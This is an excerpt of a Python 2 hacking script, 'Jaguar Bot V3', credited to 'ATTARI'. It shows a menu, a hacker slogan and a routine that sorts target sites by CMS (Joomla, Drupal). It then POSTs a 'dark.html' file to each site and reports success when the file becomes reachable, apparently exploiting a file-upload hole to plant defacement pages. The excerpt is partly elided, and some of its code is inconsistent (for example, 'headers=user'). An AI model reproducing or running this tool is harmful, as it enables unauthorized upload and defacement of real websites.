...
import requests
try:
    os.system('title [+] Coded By ATTARI : Jaguar Bot V3')
except:
    pass
if system() == 'Windows':
    os.system('cls')
...
nadafa()
print '\n\n\n'+logo+'\n\n'
print ('{}{}\t\t\t\t\t   https://facebook.com/attari.pro').format(fbl,sb)
print ('''{}{}

\t\t1) Run Jaguar Bot (ATTARI) V3.
\t\t2) Filter Cms.
...
def message():
    if system() == 'Windows':
        ...
        pass
    print'\n\n\n\n\n\n\n\n'
    print bb,'===> Message From ATTARI : The Hacker Make Tool Not Tool Make Hacker'
    print'\n\n\n\n\n\n\n\n'
...
def ATTARI(i):
    ...
    #filter joomla
        ...
        #drupal
            ...
            filename = open("files/dark.html",'rb')
            files = {"file": filename}
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
            r = requests.post(url,files=files,headers=user)
            if 'dark.html' in r.content:
                vuln = i+'/dark.html'
                success(fabrik)
